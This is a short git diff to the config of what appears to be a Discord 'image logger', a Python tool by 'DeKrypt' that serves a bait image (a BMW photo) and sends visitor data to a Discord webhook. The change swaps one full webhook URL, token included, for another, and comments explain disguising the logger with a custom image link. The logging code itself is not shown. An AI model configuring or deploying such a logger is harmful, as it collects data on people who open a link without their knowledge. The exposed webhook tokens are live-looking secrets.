@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1357331351044493433/zK2nCktXZkznTfq4ruOI4cfbgCuDH9XRrrHrR0FBmYyiEZb2OMr6rtj5DUpTFz5ix07E",
+    "webhook": "https://discord.com/api/webhooks/1359158831850193046/G41Ou1GBQ1eO1nzKeFGX71ZNXtcCu4TpKeU0rDF8wsWT_5Avi88cCInino_ryo97jOyv",
     "image": "https://kovar.vn/wp-content/uploads/2020/08/bmw-i8.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
